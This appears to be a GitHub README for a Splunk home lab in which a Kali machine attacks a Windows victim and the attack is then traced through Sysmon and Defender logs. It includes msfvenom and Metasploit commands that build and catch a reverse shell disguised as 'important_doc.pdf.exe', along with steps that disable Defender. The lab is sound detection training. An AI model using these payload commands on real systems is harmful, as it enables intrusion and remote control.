# Splunk Home Lab

## Overview
This project documents a **home lab built to simulate attacker activity and detect it using Splunk**. The lab environment consists of two Windows 11 virtual machines and a Kali Linux attacker machine:

- **SOC Workstation** - Runs Splunk Enterprise and performs log analysis
- **Victim Workstation** - Generates logs and forwards them to Splunk using Splunk Universal Forwarder
- **Kali Workstation** - Attacks the victim machine
  
The objective of this lab was to:

- Deploy **Splunk Enterprise and Splunk Universal Forwarder**
- Configure **Sysmon for enhanced endpoint telemetry**
- Simulate attacker activity from **Kali Linux**
- Detect and investigate the attack using **Splunk searches and log analysis**
	


### Skills Learned

- Splunk deployement and log analysis
- Sysmon telemetry investigation
- Windows Defender log analysis
- Attack detection and investigation
- Network reconnaissance detection
- Malware execution monitoring
- Log forwarding and ingestion configuration
- Security lab environment deployment

### Tools Used

- Windows 11 Enterprise
- Splunk Enterprise
- Splunk Universal Forwarder
- Windows Defender
- Sysmon
- Kali Linux
- Nmap
- Metasploit
- msfvenom

## Lab Architecture
### Virtual Machines

**SOC Workstation (192.168.121.147)**
| Resource | Allocation |
|----------|------------|
|RAM       |8 GB        |
|CPU       |4 Cores     |
|Disk      |100 GB      |

**Purpose**
- Hosts **Splunk Enterprise**
- Recieves logs from victim system
- Performs investigation and analysis

**Victim Workstation (192.168.121.148)**
| Resource | Allocation |
|----------|------------|
|RAM       |6 GB        |
|CPU       |2 Cores     |
|Disk      |60 GB       |

**Purpose**
- Runs **Sysmon**
- Runs **Splunk Universal Forwarder**
- Generates logs from simulated attacker activity

**Kali Workstation (192.168.121.128)**
| Resource | Allocation |
|----------|------------|
|RAM       |4 GB        |
|CPU       |2 Cores     |
|Disk      |50 GB       |

**Purpose**
- Attacks Victim Workstation
- Generates payload with msfvenom
- Runs Metasploit

**VmWare setup with all virtual machines running:**
![Lab Architecture Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Lab%20Architecture%20Screenshot.png)

## Network Configuration
Windows Firewall blocks some traffic by default.

ICMP was enabled on both Windows machines to test the connectivity between them:

```PowerShell
New-NetFirewallRule -DisplayName "Allow ICMPv4-Inbound" -Protocol ICMPv4 -Direction Inbound -Action Allow
```

Splunk log forwarding requires TCP port **9997**. This was configured to allowed on the SOC Workstation:

```PowerShell
New-NetFirewallRule -DisplayName "SplunkForwarder" -Direction Inbound -Protocol TCP -LocalPort 9997 -Action Allow
```

Connectivity test:

```PowerShell
Test-NetConnection 192.168.121.147 -Port 9997
```

**Succesful Test-NetConnection output**
![Network Configuration Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Network%20Configuration%20Screenshot.png)

## Sysmon Deployment
Sysmon was installed on the **Victim Workstation** to provide detailed endpoint telemetry.

Installation command:

```PowerShell
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

The configuration file used was from the [**sysmon-modular repository**](https://github.com/olafhartong/sysmon-modular), which provides a strong baseline configuration.

Verify Sysmon is running:

```PowerShell
Get-Service "Sysmon64" | Select-Object Name,Status,StartType
```

**Sysmon service running:**
![Sysmon Deployement Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Sysmon%20Deployement%20Screenshot.png)

## Splunk Universal Forwarder Configuration
**Splunk Universal Forwarder** was installed on the **Victim Workstation**.

During installation the receiver was configured:

```
192.168.121.147:9997
```

An **inputs.conf** file was created to define the logs forwarded to Splunk.

Forwarded logs include:

- Security
- System
- Application
- Sysmon Operational
- Windows Defender Operational
- PowerShell Operational

Example configuration:

```
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = lab-victim
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
index = lab-victim
disabled = false
source = Microsoft-Windows-Windows Defender/Operational
blacklist = 1151,1150,2000,1002,1001,1000

[WinEventLog://Microsoft-Windows-Powershell/Operational]
index = lab-victim
disabled = false
source = Microsoft-Windows-PowerShell/Operational
blacklist = 4100,4105,4106,40961,40962,53504

[WinEventLog://Application]
index = lab-victim
disabled = false

[WinEventLog://Security]
index = lab-victim
disabled = false

[WinEventLog://System]
index = lab-victim
disabled = false
```

Restart the forwarder:

```PowerShell
cd "C:\Program Files\SplunkUniversalForwarder\bin"
.\splunk restart
```

**inputs.conf configuration:**
![Splunk Universal Forwarder Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Splunk%20Universal%20Forwarder%20Screenshot.png)

## Splunk Enterprise Configuration
**Splunk Enterprise** was installed on the **SOC Workstation**.

Web interface:

```
http://localhost:8000
```

In the Splunk web interface, a recieving port was configured for log ingestion:

```
Settings -> Forwarding and Receiving -> Receive Data -> Port 9997
```

A dedicated index was created:

```
lab-victim
```

Testing ingestion on the Splunk Search & Reporting app:

```
index=lab-victim | head 20
```

**Splunk search results showing the first 20 events from the index**
![Splunk Enterprise Configuration Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Splunk%20Enterprise%20Configuration%20Screenshot.png)

## Attack Simulation
Attacker activity was simulated using the **Kali Linux Workstation**

### Network Reconnaissance
RDP was intentionally enabled on the **Victim Workstation** to be discovered by Nmap:

```PowerShell
Set-NetFirewallRule -DisplayGroup "Remote Desktop" -Enabled True -Profile Any
Start-Service -Name TermService
```

RDP Connections were enabled:

```PowerShell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
```

An Nmap scan was executed from the **Kali Linux Workstation**

```bash
sudo nmap -sV -sC 192.168.121.148
```

**Nmap scan results showing open RDP port (3389):**
![Network Reconnaissance Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Network%20Reconnaissance%20Screenshot.png)

### Malware Execution
A reverse shell payload was generated with **msfvenom**

```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.121.128 lport=4444 -f exe -o important_doc.pdf.exe
```

Metasploit handler:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set lhost 192.168.121.128
exploit
```

The payload was hosted via a Python HTTP server:

```bash
python3 -m http.server 8080
```

The **Victim Workstation** downloaded the file from:

```
http://192.168.121.128:8080
```

If **Windows Defender is enabled**, the file is quarantined.

The malware detection event is visible in Splunk from the **Windows Defender** logs. After this point, Windows Defender was intentionally disabled to continue the lab

**Windows Defender malware detection event in Splunk:**
![Malware Detection Windows Defender Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Malware%20Execution%20Windows%20Defender%20Screenshot.png)

### Post-Exploitation Activity
Once the reverse shell was established, reconnaissance commands were executed:

```bash
net user
net localgroup
ipconfig
```

These commands generate telemetry in **Sysmon logs**.

**Kali terminal showing shell session:**
![Post Exploit Activity Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Post%20Exploit%20Activity%20Screenshot.png)

## Detection & Investigation in Splunk
Investigation begins by searching through the victim index:

```
index="lab-victim"
```

From here, the suspicious attacker IP is found in the **dest** field.

**Suspicious attacker IP found in dest field:**
![Suspicious IP Detection Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Suspicious%20IP%20Detection%20Screenshot.png)

After identifying this suspicious IP, search for it:

```
index="lab-victim" 192.168.121.128
```

Suspicious ports appear in the **dest_port** field:

- **3389** - RDP (This port is shown due to the earlier Nmap scan, where 3389 (RDP) was found to be open)
- **8080** - HTTP malware hosting
- **4444** - Reverse shell

**Suspicious ports found in dest_port field after filtering for the suspicious IP:**
![Suspicious Port Detection Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Suspicious%20Port%20Detection%20Screenshot.png)


## Identifying the Malicious Process
Add port 4444 to the filter to investigate it further:

```
index="lab-victim" 192.168.121.128 dest_port=4444
```

There are multiple **Sysmon events** present for this port.

Sysmon Events reveal the malware file through the **Image field**

**Sysmon event showing the name of the malware file:**
![Sysmon Image Field Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Sysmon%20Image%20Field%20Screenshot.png)

Now that the malware file name is identified, a new search is created to include the malware:

```
index="lab-victim" important_doc.pdf.exe
```

Many Sysmon events are returned.

Looking at the **EventID field**, there are numerous Sysmon events of interest relating to the malware file.

**Sysmon Event IDs related to the malware file search query:**
![Sysmon Event IDs Related to Malware Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Sysmon%20Event%20IDs%20Related%20to%20Malware%20Screenshot.png)

Relevant Sysmon Event IDs:

| EventID  | Description       |
|----------|-------------------|
|1         |Process Creation   |
|3         |Network Connection |
|5         |Process Terminated |
|7		   |Image Loaded       |
|10        |Process Access     |
|13        |Registry Event     |

Adding **EventID 1** to the search will identify process creation activity:

```
index="lab-victim" important_doc.pdf.exe EventID=1
```

Expanding the first **Sysmon event** from this search gives valuble information on what the malware did.

The **Sysmon event** shows that important_doc.pdf.exe spawned cmd.exe.

The **Sysmon event** also shows the relevant MITRE technique with the **technique_id field**.

This event shows MITRE Technique ```T1059.003 - Windows Command Shell```

**Sysmon Event ID 1 Expanded:**
![Malware Spawns CMD Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Malware%20Spawns%20CMD%20Screenshot.png)

## Reconstructing the Attack Timeline
Searching by the **ProcessGuid** identified in the **Sysmon event** will help reconstruct the attack timeline:

```
index="lab-victim" {acf80fbf-5dd2-69b4-5904-000000001200}
```

Create a timeline table to clean up results:

```
index="lab-victim" {acf80fbf-5dd2-69b4-5904-000000001200}
| table _time,ParentImage,Image,CommandLine
```

Sort this table by ```_time``` to reveal the complete attack sequence.

The Splunk table shows that import_doc.pdf.exe spawned cmd.exe. From there, multiple reconnaissance commands were executed.

Example commands executed

```PowerShell
net user
net localgroup
ipconfig
```

**Splunk table showing chronological attack timeline:**
![Attack Timeline Screenshot](https://github.com/Cyb3rTripp/Splunk-Home-Lab/blob/main/%20Screenshots/Attack%20Timeline%20Screenshot.png)

## Conclusion
This lab demonstrates a **basic attack and detection workflow using Splunk**

The entire attack-from **Nmap reconnaissance to command injection**-was visible in Splunk using the correct filtering and investigation techniques.

Key takeaways:

- Sysmon provides detailed endpoint telemetry
- Windows Defender logs reveal detected malware
- Process creation monitoring helps reconstruct attacker activity
- MITRE ATT&CK mappings provide valuable context for investigations

This project provided hands-on experience with **endpoint telemetry, attacker simulation, and SOC-style log investigation using Splunk**.
